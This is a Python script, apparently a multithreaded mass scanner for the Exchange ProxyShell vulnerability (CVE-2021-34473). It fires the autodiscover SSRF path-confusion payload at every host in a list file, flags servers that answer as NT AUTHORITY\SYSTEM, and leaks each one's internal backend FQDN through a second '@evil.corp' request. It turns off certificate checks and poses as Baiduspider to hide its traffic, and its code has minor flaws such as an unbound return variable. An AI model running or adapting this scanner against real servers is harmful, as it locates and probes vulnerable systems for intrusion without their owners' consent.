import re
import urllib3
import requests,sys
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed

requests.packages.urllib3.disable_warnings()


headers = {
    'Accept-Language':'cn-CN,cn;q=0.5',
    'User-Agent':'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'
}

def get_fqdn(url):
        payload = "/autodiscover/autodiscover.json?@evil.corp/ews/exchange.asmx?&Email=autodiscover/autodiscover.json%3F@evil.corp"
        
        with requests.get("https://{url}{payload}".format(url=url, payload=payload), verify=False, timeout=5, headers=headers) as response:
            
            try:
            
                fqdn = response.headers["X-CalculatedBETarget"]
            
            except Exception as e:
                print(e)

            return(fqdn)


def proxyshell_check(url):
    url = url.strip()
    payload = "/autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com"
    
    try:
        with requests.get("https://{url}{payload}".format(url=url, payload=payload), allow_redirects=True, timeout=20, verify=False, headers=headers) as response:
            
            match = re.search(r"NT AUTHORITY\\SYSTEM", response.text)

            if response.status_code == 500 and match:
                print("[+] CVE-2021-34473 Vulnerable", url, "FQDN:",get_fqdn(url))
            
    
    except Exception as e:
        pass


def thread(thread, file):
    with ThreadPoolExecutor(thread) as executor:
        with open(file, "r") as file:
            futures = []


            for url in file:
                futures.append(executor.submit(proxyshell_check, url))
            
            if len(futures) >= thread:
                try:
                    for future in as_completed(futures, 30):

                        if future.result() is not None:
                            print(future.result())
                        futures.remove(future)
                except:
                    pass


if __name__ == '__main__':

    parser = argparse.ArgumentParser(description='')
    parser.add_argument("--thread", dest="thread", default=10, type=int)
    parser.add_argument("--file", dest="file", required=True)
    args = parser.parse_args()

    try:
        thread(args.thread, args.file)
    except KeyboardInterrupt:
        print("Exit...")
